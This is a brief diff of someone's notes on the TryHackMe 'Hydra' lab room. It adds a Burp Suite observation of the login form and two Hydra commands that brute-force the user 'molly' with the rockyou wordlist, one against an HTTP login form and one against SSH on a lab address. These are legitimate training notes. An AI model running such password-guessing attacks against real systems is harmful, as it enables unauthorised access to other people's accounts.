@@ -3,4 +3,9 @@ https://tryhackme.com/room/hydra
 -----
 Hydra
 -----
-hydra -l molly -P /home/myna/Music/wordlist/rockyou.txt 10.10.192.220 http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect."  
+Burp suite to find login form:- username=molly&password=dafadfadf
+
+hydra -l molly -P /home/myna/Music/wordlist/rockyou.txt 10.10.192.220 http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect."
+
+hydra -l molly -P /home/myna/Music/rockyou.txt 10.10.192.220 ssh -V
+
